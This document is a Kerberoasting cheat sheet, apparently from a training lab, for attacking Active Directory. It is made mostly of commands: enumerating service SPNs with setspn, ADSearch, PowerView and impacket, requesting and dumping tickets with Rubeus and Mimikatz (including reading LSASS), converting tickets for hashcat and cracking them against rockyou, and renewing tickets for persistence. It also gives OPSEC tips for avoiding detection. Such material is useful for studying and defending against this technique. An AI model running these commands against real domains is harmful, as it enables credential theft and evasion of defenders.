Hash format: 
RC4-HMAC
```bash
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
AES-256
```bash
hashcat -m 19700 sqldev_tgs /usr/share/wordlists/rockyou.txt
```
- Creates 4768 event, multiple 4768 event over short time from one user can standout.
- Windows tickets uses AES128 and 258, RC4 tickets can standout.
- Honey Tickets may be used by defenders (Dummy SPNs that is never supposed to be used).
# Checklist and OPSEC
- Creates 4768 event, multiple 4768 event over short time from one user can standout.
- Windows tickets uses AES128 and 258, RC4 tickets can standout.
- Honey Tickets may be used by defenders (Dummy SPNs that is never supposed to be used).
- [ ] Enumerate for valid SPNs
- [ ] Enumerate encryption scheme

| Encryption | E-Type |
| ---------- | ------ |
| RC4        | 23     |
| AES-128    | 17     |
| AES-256    | 18     

| msDS-SupportedEncryptionTypes | encryption                           |
| ----------------------------- | ------------------------------------ |
| 0x01 (1)                      | DES-CBC-CRC                          |
| 0x02 (2)                      | DES-CBC-MD5                          |
| 0x04 (4)                      | RC4-HMAC                             |
| 0x08 (8)                      | AES128-CTS-HMAC-SHA1-96              |
| 0x10 (16)                     | AES256-CTS-HMAC-SHA1-96              |
| 0x18 (24)                     | AES128 + AES256                      |
| 0x1F (31)                     | Enables DES, RC4, AES128, and AES256 |
| 0x00 (0)                      | Default: RC4-HMAC                    |

- [ ] Kerberoast 
- [ ] Extract tickets already stored in memory
# Windows
## Semi-Manual
- Alll tickets would be load in memory which we will require mimikatz to extract these tickets from memory
(LOLBAS + Mimikatz) Manual SPN Enumeration
```powershell
C:\htb> setspn.exe -Q */*
CN=sqlprod,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SPSJDB.inlanefreight.local:1433
CN=sqlqa,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/SQL-CL01-01inlanefreight.local:49351
CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
        adfsconnect/azure01.inlanefreight.local

```
(LOLBAS + Mimikatz) Targeted SPN ticket request
```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```
Retrieve all tickets
```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```
Mimikatz extraction base64 blob
```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```
Prepare for cracking
```bash
echo "<base64 blob>" |  tr -d \\n
cat encoded_file | base64 -d > sqldev.kirbi
kirbi2john.py sqldev.kirbi > crack_file
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
## Automated Tooling
(ADSearch) SPN enumeration
```bash
ADSearch.exe -s "(&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=krbtgt)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))" --attributes cn,samaccountname,serviceprincipalname
```
(Rubeus) SPN enumeration
```powershell
Rubeus.exe kerberoast /stats
```
(PowerView) SPN encrpytion scheme
```powerhsell
Get-DomainUser <SPN> -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes
```
(Rubeus) Extract ticket of currently logon session
- Rubeus extracts ticket using LSA APIs
```bash
Rubeus.exe triage
```
(Rubeus) Extract every single ticket
- Use /service and /luid to target specific service or logon session
```bash
Rubeus.exe dump /service:krbtgt /nowrap
```
(Mimikatz) Dumping tickets from LSASS memory
- Bad OPSEC because interacting with LSASS
```bash
mimikatz.exe sekurlsa::ekeys
```
(Rubeus) Kerberoasting (default john hash)
- Ask for RC4 encryption ticket (easier encryption scheme to crack) `/tgtdeleg` (xin dùng encryption RC4, **does not work** Windows Server 2019 Domain Controller )
- Target an SPN with /spn:<SPN_NAME>
```bash
Rubeus.exe kerberoast /user:testspn /nowrap
```
# Linux
(GetUserSPNs) SPN enumeration
```bash
impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100
```
(GetUserSPNs) Kerberoasting requesting all TGS tickets
```bash
impacket-GetUserSPNs.py <DOMAIN>/<USERNAME>:<PASSWORD> -dc-ip <DC IP> -request 

impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request -outputfile krb.hash
```
(GetUserSPNs) Targeted TGS ticket request
```bash
impacket-GetUserSPNs.py 'medin.local/tm:Password1$' -dc-ip 172.16.105.100 -request-user sqldev -outputfile sqldev_tgs.hash
```
### Persistence
(Rubeus) Obtained ticket information
```bash
Rubeus.exe describe /ticket:<TICKET>
```
(Rubeus) Renew ticket
```bash
Rubeus.exe renew /ticket:<TICKET> /nowrap
```

